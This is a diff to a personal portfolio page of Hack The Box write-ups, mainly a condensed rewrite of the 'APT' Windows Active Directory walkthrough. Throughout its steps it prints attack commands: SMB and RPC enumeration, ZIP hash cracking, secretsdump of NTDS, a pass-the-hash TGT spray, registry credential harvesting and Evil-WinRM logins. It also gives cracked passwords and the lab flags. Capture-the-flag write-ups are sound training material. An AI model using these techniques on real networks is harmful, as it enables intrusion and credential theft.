@@ -383,50 +383,74 @@
       </div>
 
       <!-- CARD: APT -->
-      <div id="apt" class="bento-box wide" tabindex="0" style="cursor:pointer; padding:0;"
+      <div id="apt" class="bento-box wide" tabindex="0"
+           style="cursor:pointer; padding:0;"
            data-difficulty="insane" data-tags="ad,privesc,windows,rpc,smb" data-machine="apt"
-           onclick="openDrawer(this,'apt')" onkeydown="if(event.key==='Enter')openDrawer(this,'apt')">
+           onclick="openDrawer(this,'apt')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'apt')">
         <div class="wu-accent insane"></div>
         <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
           <div>
             <img src="APT/1.png" alt="APT writeup screenshot" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
-            <div class="box-meta"><span class="tag">RPC / Active Directory</span><span style="font-size:0.85rem;color:#ef4444;"><span class="diff-dot" style="background:#ef4444;box-shadow:0 0 6px #ef4444;"></span>Insane</span></div>
+            <div class="box-meta">
+              <span class="tag">RPC / Active Directory</span>
+              <span style="font-size:0.85rem;color:#ef4444;">
+                <span class="diff-dot" style="background:#ef4444;box-shadow:0 0 6px #ef4444;"></span>Insane
+              </span>
+            </div>
             <div class="box-title">HTB: APT</div>
             <div class="box-desc">RPC and SMB enumeration, backup archive analysis, and an Active Directory attack path documented with screenshots.</div>
           </div>
           <div class="box-footer"><span>OS // WINDOWS</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
         </div>
       </div>
+
       <!-- CARD: TombWatcher -->
-      <div id="tombwatcher" class="bento-box wide" tabindex="0" style="cursor:pointer; padding:0;"
+      <div id="tombwatcher" class="bento-box wide" tabindex="0"
+           style="cursor:pointer; padding:0;"
            data-difficulty="medium" data-tags="ad,privesc,windows,kerberos,bloodhound" data-machine="tombwatcher"
-           onclick="openDrawer(this,'tombwatcher')" onkeydown="if(event.key==='Enter')openDrawer(this,'tombwatcher')">
+           onclick="openDrawer(this,'tombwatcher')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'tombwatcher')">
         <div class="wu-accent medium"></div>
         <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
           <div>
             <img src="Tombwatcher%20(Assumed%20Breach%20Box)/Screenshot_1448-05-13_at_9.00.26_PM.png" alt="TombWatcher writeup screenshot" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
-            <div class="box-meta"><span class="tag">Assumed Breach / AD</span><span style="font-size:0.85rem;color:var(--neon-cyan);"><span class="diff-dot" style="background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);"></span>Medium</span></div>
+            <div class="box-meta">
+              <span class="tag">Assumed Breach / AD</span>
+              <span style="font-size:0.85rem;color:var(--neon-cyan);">
+                <span class="diff-dot" style="background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);"></span>Medium
+              </span>
+            </div>
             <div class="box-title">HTB: TombWatcher</div>
             <div class="box-desc">Assumed-breach Active Directory chain featuring targeted Kerberoasting, delegated group membership, gMSA password retrieval, and ownership abuse.</div>
           </div>
           <div class="box-footer"><span>OS // WINDOWS</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
         </div>
       </div>
-     <!-- CARD: Browsed -->
-      <div id="browsed" class="bento-box wide" tabindex="0" style="cursor:pointer; padding:0;"
+
+      <!-- CARD: Browsed -->
+      <div id="browsed" class="bento-box wide" tabindex="0"
+           style="cursor:pointer; padding:0;"
            data-difficulty="medium" data-tags="linux,browser extension,ssrf" data-machine="browsed"
-           onclick="openDrawer(this,'browsed')" onkeydown="if(event.key==='Enter')openDrawer(this,'browsed')">
+           onclick="openDrawer(this,'browsed')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'browsed')">
         <div class="wu-accent medium"></div>
         <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
           <div>
-            <img src="Tombwatcher%20(Assumed%20Breach%20Box)/Screenshot_1448-05-13_at_9.00.26_PM.png" alt="TombWatcher writeup screenshot" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
-            <div class="box-meta"><span class="tag">Linux / Browser Extension</span><span style="font-size:0.85rem;color:var(--neon-cyan);"><span class="diff-dot" style="background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);"></span>Medium</span></div>
+            <img src="Tombwatcher%20(Assumed%20Breach%20Box)/Screenshot_1448-05-13_at_9.00.26_PM.png" alt="Browsed writeup screenshot" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
+            <div class="box-meta">
+              <span class="tag">Linux / Browser Extension</span>
+              <span style="font-size:0.85rem;color:var(--neon-cyan);">
+                <span class="diff-dot" style="background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);"></span>Medium
+              </span>
+            </div>
             <div class="box-title">HTB: Browsed</div>
-            <div class="box-desc">Browsed is a medium-difficulty Linux machine centred around abusing browser extension functionality to access internal services. By uploading a malicious Chrome extension, we intercept a developer’s browsing activity and uncover an internal Gitea instance hosting a Flask application..</div>
+            <div class="box-desc">Browsed is a medium-difficulty Linux machine centred around abusing browser extension functionality to access internal services. By uploading a malicious Chrome extension, we intercept a developer’s browsing activity and uncover an internal Gitea instance hosting a Flask application.</div>
           </div>
           <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
         </div>
       </div>
+  
       <!-- CARD: Forest -->
       <div id="forest" class="bento-box wide" tabindex="0"
            style="cursor:pointer; padding:0;"
@@ -554,7 +578,8 @@
         { name: "Root Flag", value: "110" }
       ]
     },
-    apt: {
+   
+      apt: {
       title: "HTB: APT",
       badge: "Windows // Insane",
       icon: "APT/1.png",
@@ -569,155 +594,82 @@
         {
           phase: "RECONNAISSANCE",
           title: "Initial Port Scanning & RustScan / Nmap",
-          body: `Scanned target host ($ip = 10.129.96.60) using RustScan and Nmap[cite: 18]:
-<pre><code class="language-bash">ip=10.129.96.60
-rustscan -a $ip
-
-PORT    STATE SERVICE REASON
-80/tcp  open  http    syn-ack
-135/tcp open  msrpc   syn-ack</code></pre>
-<pre><code class="language-bash">sudo nmap -sVC -p80,135 10.129.96.60 -oN apt.txt
-
-PORT    STATE SERVICE VERSION
-80/tcp  open  http    Microsoft IIS httpd 10.0
-|_http-title: Gigantic Hosting | Home
-|_http-server-header: Microsoft-IIS/10.0
-135/tcp open  msrpc   Microsoft Windows RPC</code></pre>`
+          body: "Scanned target host using RustScan and Nmap to discover open ports for HTTP (80) and MSRPC (135). \n\n[INSERT IMAGE HERE: APT/Screenshot_PortScan.png]",
+          code: "ip=10.129.96.60\nrustscan -a $ip\nsudo nmap -sVC -p80,135 10.129.96.60 -oN apt.txt"
         },
         {
           phase: "MSRPC ENUMERATION",
           title: "MSRPC Endpoint Analysis (rpcdump)",
-          body: `<p>Microsoft Remote Procedure Call (MSRPC) is a client-server mechanism allowing programs to invoke procedures remotely[cite: 18]. Ran <code>rpcdump.py</code>[cite: 18]:</p>
-<pre><code class="language-bash">rpcdump.py 10.129.96.60
-# Received 267 endpoints.</code></pre>
-<p>Observed multiple dynamic TCP bindings (<code>ncacn_ip_tcp:...:port</code>) and named pipes (<code>ncacn_np:...</code>)[cite: 18].</p>`
+          body: "Microsoft Remote Procedure Call allows programs to invoke procedures remotely. Running rpcdump.py retrieved 267 endpoints across dynamic TCP bindings and named pipes.\n\n[INSERT IMAGE HERE: APT/Screenshot_Rpcdump.png]",
+          code: "rpcdump.py 10.129.96.60"
         },
         {
           phase: "DCOM ENUMERATION",
           title: "DCOM IOXIDResolver Interface Identification",
-          body: `Enumerated interface registrations directly from <code>rpcss.dll</code> on port 135 using <code>rpcmap.py</code>[cite: 18]:
-<pre><code class="language-bash">rpcmap.py ncacn_ip_tcp:10.129.96.60[135]</code></pre>
-<p>Identified the IOXIDResolver interface (UUID: <code>99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</code>)[cite: 18].</p>
-<blockquote class="callout"><strong>The Hotel Analogy:</strong> DCOM is a hotel. IOXIDResolver is the concierge who tells you which corridor leads to which room, and when asked what entrances exist, it hands over the guest register listing every door and address without checking authentication[cite: 18].</blockquote>`
+          body: "Enumerated interface registrations directly from rpcss.dll on port 135 using rpcmap.py, identifying the IOXIDResolver interface.\n\n[INSERT IMAGE HERE: APT/Screenshot_Rcpmap.png]",
+          code: "rpcmap.py ncacn_ip_tcp:10.129.96.60[135]"
         },
         {
           phase: "IPV6 DISCOVERY",
           title: "Interface Enumeration via IOXIDResolver.py",
-          body: `<p>Executed the Airbus Security research script <code>IOXIDResolver.py</code> to query network interfaces over DCOM without authentication[cite: 18]:</p>
-<pre><code class="language-bash">python3 IOXIDResolver.py -t $ip
-[*] Retrieving network interface of 10.129.96.60
-Address: apt
-Address: 10.129.96.60
-Address: dead:beef::9d98:6fef:3f3e:3edd
-Address: dead:beef::b885:d62a:d679:573f</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.23.18_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.23.18_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.23.18_PM.png"/></a><figcaption>IOXIDResolver script output</figcaption></figure>
-<figure class="image" data-notion-image="APT/1.png"><a href="APT/1.png"><img style="width:100%" src="APT/1.png"/></a><figcaption>Architecture Diagram</figcaption></figure>`
-        },
-        {
-          phase: "IPV6 RECON",
-          title: "IPv6 Ping & Full Port Scanning",
-          body: `Verified reachability of the discovered IPv6 addresses using <code>ping6</code>[cite: 10, 18]:
-<pre><code class="language-bash">ping6 -c 2 dead:beef::b885:d62a:d679:573f
-ping6 -c 2 dead:beef::9d98:6fef:3f3e:3edd</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.25.34_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.25.34_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.25.34_PM.png"/></a></figure>
-<p>Performed a full TCP port scan over IPv6, revealing domain controller services (Kerberos, LDAP, SMB, WinRM)[cite: 18]:</p>
-<pre><code class="language-bash">sudo nmap -6 -p- --min-rate 1000 dead:beef::b885:d62a:d679:573f -oN ipv6_full.txt</code></pre>`
+          body: "Executed the IOXIDResolver.py script to query network interfaces over DCOM without authentication, disclosing hidden IPv6 interface addresses.\n\n[INSERT IMAGE HERE: APT/Screenshot_1448-05-15_at_7.23.18_PM.png]",
+          code: "python3 IOXIDResolver.py -t 10.129.96.60"
         },
         {
           phase: "SMB ENUMERATION",
           title: "Hosts Configuration & Anonymous SMB Share Access",
-          body: `Added host mapping to <code>/etc/hosts</code>[cite: 18]:
-<pre><code class="language-bash">grep -q 'htb.local' /etc/hosts || echo -e 'dead:beef::b885:d62a:d679:573f\thtb.local apt.htb.local apt.htb APT\ndead:beef::9d98:6fef:3f3e:3edd\thtb.local apt.htb.local apt.htb APT\n' | sudo tee -a /etc/hosts</code></pre>
-<p>Enumerated SMB shares with NetExec and accessed the readable <code>backup</code> share[cite: 11, 12, 18]:</p>
-<pre><code class="language-bash">nxc smb dead:beef::b885:d62a:d679:573f -u '' -p '' --shares --users --groups
-smbclient -N //dead:beef::b885:d62a:d679:573f/backup</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.33.32_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.33.32_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.33.32_PM.png"/></a></figure>
-<p>Downloaded <code>backup.zip</code> from the share[cite: 12, 18]:</p>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.38.07_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.38.07_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.38.07_PM.png"/></a></figure>`
+          body: "Mapped discovered IPv6 addresses in /etc/hosts, enumerated SMB shares via NetExec, and accessed the readable backup share to download backup.zip.\n\n[INSERT IMAGE HERE: APT/Screenshot_1448-05-15_at_7.33.32_PM.png]",
+          code: "nxc smb dead:beef::b885:d62a:d679:573f -u '' -p '' --shares\nsmbclient -N //dead:beef::b885:d62a:d679:573f/backup"
         },
         {
           phase: "ARCHIVE ANALYSIS",
-          title: "ZipArchive Inspection & ZipCrypto Cracking",
-          body: `Inspected archive structure using <code>zipinfo</code>[cite: 18]:
-<pre><code class="language-bash">file backup.zip
-zipinfo -v backup.zip</code></pre>
-<p>Extracted the ZipCrypto hash and cracked it using John the Ripper with <code>rockyou.txt</code>[cite: 13, 18]:</p>
-<pre><code class="language-bash">zip2john backup.zip > backup.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.52.40_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.52.40_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.52.40_PM.png"/></a></figure>
-<p>Cracked password: <code>iloveyousomuch</code>[cite: 13, 18]. Unzipped files revealed the offline AD credential kit[cite: 14, 18]:</p>
-<pre><code class="language-bash">find . -printf '%M %u %g %10s %p\n' | sort -k5</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.56.18_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.56.18_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.56.18_PM.png"/></a></figure>`
+          title: "ZipArchive Cracking & Secretsdump",
+          body: "Generated a hash via zip2john and cracked backup.zip using John the Ripper (password: iloveyousomuch) to reveal the offline AD credential kit.\n\n[INSERT IMAGE HERE: APT/Screenshot_1448-05-15_at_7.52.40_PM.png]",
+          code: "zip2john backup.zip > backup.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt backup.hash"
         },
         {
           phase: "SECRETSDUMP",
           title: "Offline AD Database & Registry Dump",
-          body: `Ran Impacket's <code>secretsdump.py</code> against the offline NTDS database and registry hives[cite: 15, 18]:
-<pre><code class="language-bash">impacket-secretsdump -ntds "./Active Directory/ntds.dit" -system registry/SYSTEM -security registry/SECURITY LOCAL > dumps.txt</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_8.01.11_PM.png"><a href="APT/Screenshot_1448-05-15_at_8.01.11_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_8.01.11_PM.png"/></a></figure>
-<p>Recovered over 2,000 user hashes and the <code>krbtgt</code> hash[cite: 18]. Extracted clean usernames list[cite: 18]:</p>
-<pre><code class="language-bash">grep ':::' dumps.txt | awk -F: '{print $1}' > users</code></pre>`
+          body: "Ran Impacket secretsdump.py against the offline NTDS database and registry hives to recover thousands of user hashes and the krbtgt hash.\n\n[INSERT IMAGE HERE: APT/Screenshot_1448-05-15_at_8.01.11_PM.png]",
+          code: "impacket-secretsdump -ntds './Active Directory/ntds.dit' -system registry/SYSTEM -security registry/SECURITY LOCAL > dumps.txt"
         },
         {
           phase: "KERBEROS SPRAYING",
           title: "Kerbrute Enumeration & TGT Hash Brute-Forcing",
-          body: `<p>Validated principals using <code>kerbrute</code>, confirming <code>henry.vinson</code> as active[cite: 18]. Because standard direct hashing did not work due to password-reuse quirks, ran a parallelized bash one-liner with <code>impacket-getTGT</code> across unique NTLM hashes to find the reused credential accepted by the KDC[cite: 16, 18]:</p>
-<pre><code class="language-bash">TARGET='htb.local/henry.vinson@apt.htb'
-rm -f /tmp/got_hit.flag henry.vinson@apt.htb.ccache
-shuf hashes_uniq.txt | xargs -P 16 -I{} bash -c '[ -f /tmp/got_hit.flag ] && exit 0; impacket-getTGT "'"$TARGET"'" -hashes "{}" 2>&1 | grep -q "PREAUTH_FAILED" || { cp henry.vinson@apt.htb.ccache /tmp/HIT_henry.ccache 2>/dev/null && echo "[+] HIT: {}" && touch /tmp/got_hit.flag; }'</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_8.55.41_PM.png"><a href="APT/Screenshot_1448-05-15_at_8.55.41_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_8.55.41_PM.png"/></a></figure>`
+          body: "Ran a parallelized bash one-liner with impacket-getTGT across unique NTLM hashes to find the reused credential accepted by the KDC for henry.vinson.\n\n[INSERT IMAGE HERE: APT/Screenshot_1448-05-15_at_8.55.41_PM.png]",
+          code: "impacket-getTGT htb.local/henry.vinson@apt.htb -hashes '<HASH>'"
         },
         {
           phase: "REMOTE REGISTRY",
           title: "Querying HKU Registry Hives via Kerberos",
-          body: `Exported the ticket cache and queried user registry hives via <code>impacket-reg</code>[cite: 18]:
-<pre><code class="language-bash">export KRB5CCNAME=/tmp/HIT_henry.ccache
-impacket-reg -k apt.htb.local query -keyName HKU -s > /tmp/registry.txt 2>/tmp/reg.err</code></pre>
-<p>Searched registry output for user settings[cite: 18]:</p>
-<pre><code class="language-bash">grep -A 5 'GiganticHostingManagementSystem' /tmp/registry.txt</code></pre>
-<p>Discovered plaintext credentials inside the registry for <code>henry.vinson_adm</code>: Password <code>G1#Ny5@2dvht</code>[cite: 18].</p>`
+          body: "Exported the ticket cache and queried user registry hives via impacket-reg to discover plaintext credentials inside the registry under GiganticHostingManagementSystem for henry.vinson_adm.",
+          code: "export KRB5CCNAME=/tmp/HIT_henry.ccache\nimpacket-reg -k apt.htb.local query -keyName HKU -s > /tmp/registry.txt"
         },
         {
           phase: "USER COMPROMISE",
           title: "Evil-WinRM Shell & User Flag Capture",
-          body: `Authenticated successfully via Evil-WinRM using the administrative credentials[cite: 17, 18]:
-<pre><code class="language-bash">evil-winrm -i apt.htb -u henry.vinson_adm -p 'G1#Ny5@2dvht'</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_9.28.31_PM.png"><a href="APT/Screenshot_1448-05-15_at_9.28.31_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_9.28.31_PM.png"/></a></figure>
-<p>Read user flag[cite: 17, 18]:</p>
-<pre><code class="language-powershell">cat user.txt
-# 75791898b014e1dfb3e958db8f25b8ea</code></pre>`
+          body: "Authenticated successfully via Evil-WinRM using the administrative credentials (G1#Ny5@2dvht) and captured the user flag.\n\n[INSERT IMAGE HERE: APT/Screenshot_1448-05-15_at_9.28.31_PM.png]",
+          code: "evil-winrm -i apt.htb -u henry.vinson_adm -p 'G1#Ny5@2dvht'"
         },
         {
           phase: "PRIVILEGE ESCALATION",
           title: "PowerShell History & NTLMv1 Downgrade Analysis",
-          body: `Inspected the PSReadline console history file for <code>henry.vinson_adm</code> to review prior Administrator actions[cite: 18]:
-<pre><code class="language-powershell">type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
-<p>Discovered that <code>lmcompatibilitylevel</code> was set to <code>2</code> (forcing NTLMv1 responses)[cite: 18].</p>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_9.34.49_PM.png"><a href="APT/Screenshot_1448-05-15_at_9.34.49_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_9.34.49_PM.png"/></a></figure>`
+          body: "Inspected the PSReadline console history file for henry.vinson_adm to review prior Administrator actions, discovering that lmcompatibilitylevel was set to 2 (forcing NTLMv1 responses).\n\n[INSERT IMAGE HERE: APT/Screenshot_1448-05-15_at_9.34.49_PM.png]",
+          code: "type C:\\Users\\henry.vinson_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
         },
         {
           phase: "ROOT COMPROMISE",
           title: "Crack.sh Submission & Administrator Access",
-          body: `<p>Captured the NTLMv1 challenge-response hash via Responder/SMB listener, submitted it to crack.sh to retrieve the NTLM hash, and used it to dump domain administrator credentials[cite: 18]. Authenticated as Administrator[cite: 18]:</p>
-<pre><code class="language-bash">evil-winrm -i apt.htb -u Administrator -H c370bddf384a691d811ff3495e8a72e2</code></pre>
-<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_9.37.34_PM.png"><a href="APT/Screenshot_1448-05-15_at_9.37.34_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_9.37.34_PM.png"/></a></figure>
-<p>Captured root flag[cite: 18]:</p>
-<pre><code class="language-powershell">cat root.txt
-# 2523f245029e120145f301fc0914a9fe</code></pre>`
+          body: "Submitted the captured NTLMv1 challenge-response hash to crack.sh to retrieve the NTLM hash, then authenticated as Administrator via Evil-WinRM to capture the root flag.\n\n[INSERT IMAGE HERE: APT/Screenshot_1448-05-15_at_9.37.34_PM.png]",
+          code: "evil-winrm -i apt.htb -u Administrator -H '<HASH>'"
         }
       ],
       flags: [
-        {
-          name: "User Flag",
-          value: "75791898b014e1dfb3e958db8f25b8ea"[cite: 17]
-        },
-        {
-          name: "Root Flag",
-          value: "2523f245029e120145f301fc0914a9fe"[cite: 18]
-        }
-      ],
-      contentHtml: ``
+        { name: "User Flag", value: "75791898b014e1dfb3e958db8f25b8ea" },
+        { name: "Root Flag", value: "2523f245029e120145f301fc0914a9fe" }
+      ]
     },
+      
     facts: {
       title: "HTB: Facts",
       badge: "Linux // Easy",
